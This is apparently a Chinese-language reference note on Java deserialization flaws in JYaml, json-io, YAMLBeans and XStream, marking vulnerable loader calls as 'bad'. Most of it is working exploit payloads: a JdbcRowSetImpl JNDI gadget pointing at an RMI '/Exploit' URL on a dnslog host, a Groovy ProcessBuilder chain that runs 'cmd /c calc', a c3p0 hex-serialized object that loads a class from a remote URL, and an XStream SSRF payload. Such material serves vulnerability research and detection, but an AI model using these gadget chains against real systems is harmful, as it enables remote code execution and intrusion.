# Java反序列化文档

## JYaml反序列化

```java
import org.ho.yaml.Yaml;

public class TestJYaml {

    String data = "--- !com.sun.rowset.JdbcRowSetImpl\n"
		+ "dataSourceName: \"rmi://jyaml1.vwfkh3.dnslog.cn:1099/Exploit\"\n"
		+ "autoCommit: true";

    Yaml yaml = new Yaml();

    yaml.load(data);  //bad
    yaml.loadStream(data);  //bad
    yaml.loadType(data, Object.class);  //bad  当class指定为反序列化的类对象时，反序列化成功
    yaml.loadStreamOfType(data, Object.class);  //bad
    
}
```

## JsonIO反序列化

```pom
<dependency>
  <groupId>com.cedarsoftware</groupId>
  <artifactId>json-io</artifactId>
  <version>4.10.0</version>
</dependency>
<dependency>
  <groupId>org.codehaus.groovy</groupId>
  <artifactId>groovy-all</artifactId>
  <version>2.4.9</version>
</dependency>
```

```java
import com.cedarsoftware.util.io.JsonReader;

public class TestJsonIO {

    String poc = "{\"@type\":\"java.util.Arrays$ArrayList\",\"@items\":[{\"@id\":2,\"@type\":\"groovy.util.Expando\",\"expandoProperties\":{\"@type\":\"java.util.HashMap\",\"hashCode\":{\"@type\":\"org.codehaus.groovy.runtime.MethodClosure\",\"method\":\"start\",\"delegate\":{\"@id\":1,\"@type\":\"java.lang.ProcessBuilder\",\"command\":{\"@type\":\"java.util.ArrayList\",\"@items\":[\"cmd\",\"/c\",\"calc\"]},\"directory\":null,\"environment\":null,\"redirectErrorStream\":false,\"redirects\":null},\"owner\":{\"@ref\":1},\"thisObject\":null,\"resolveStrategy\":0,\"directive\":0,\"parameterTypes\":[],\"maximumNumberOfParameters\":0,\"bcw\":null}}},{\"@type\":\"java.util.HashMap\",\"@keys\":[{\"@ref\":2},{\"@ref\":2}],\"@items\":[{\"@ref\":2},{\"@ref\":2}]}]}";
    
    JsonReader.jsonToJava(poc);
}
```

## YAMLBeans反序列化
```pom
<dependency>
  <groupId>com.esotericsoftware.yamlbeans</groupId>
  <artifactId>yamlbeans</artifactId>
  <version>1.09</version>
</dependency>
<dependency>
  <groupId>com.mchange</groupId>
  <artifactId>c3p0</artifactId>
  <version>0.9.5.2</version>
</dependency>
```

```java
import com.esotericsoftware.yamlbeans.YamlConfig;
import com.esotericsoftware.yamlbeans.YamlReader;

public class TestYAMLBeans {

    String data = "!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n"
			+ "  userOverridesAsString: \"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707874000443616c63740016687474703a2f2f3132372e302e302e313a383038382f740003466f6f;\"";
			
    YamlConfig yc = new YamlConfig();
    YamlReader r = new YamlReader(data, yc); //yc传不传入都行
    r.read();
    r.read(Object.class);
    r.read(Object.class, Object.class);
}
```



## XStream反序列化

低版本验证

```PayLoad
SSRF
String payload = "<map>\n" +
	"  <entry>\n" +
	"    <jdk.nashorn.internal.objects.NativeString>\n" +
	"      <flags>0</flags>\n" +
	"      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
	"        <dataHandler>\n" +
	"          <dataSource class='javax.activation.URLDataSource'>\n" +
	"            <url>http://127.0.0.1:8000/ntuser.ini</url>\n" +
	"          </dataSource>\n" +
	"          <transferFlavors/>\n" +
	"        </dataHandler>\n" +
	"        <dataLen>0</dataLen>\n" +
	"      </value>\n" +
	"    </jdk.nashorn.internal.objects.NativeString>\n" +
	"    <string>test</string>\n" +
	"  </entry>\n" +
	"</map>";
````

```java

XStream xStream = new XStream();
xStream.fromXML(payload); //bad
xStream.unmarshal(payload); //bad

```

## Spring XStreamMarshaller反序列化

简介：Spring XStreamMarshaller底层调用了XStream, 开源代码库未找到相关使用

```java
XStreamMarshaller xStreamMarshaller = new XStreamMarshaller();
```

